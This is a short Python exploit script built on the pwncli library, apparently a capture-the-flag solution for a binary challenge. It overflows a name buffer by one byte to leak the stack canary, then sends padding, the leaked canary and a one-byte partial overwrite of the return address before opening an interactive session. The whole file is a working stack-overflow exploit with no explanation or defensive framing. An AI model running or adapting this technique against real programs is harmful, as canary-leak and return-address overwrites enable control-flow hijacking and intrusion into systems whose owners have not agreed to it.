from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']

p.sendafter("Input your Name:\n", "a" * 0x29)
p.recvuntil("a" * 0x29)
msg = p.recvn(7)
canary = (u64(msg+b"\x00")) << 8
log_address("canary", canary)


p.send(flat(["a"*0x28, canary, 0, "\x3e"]))

p.interactive()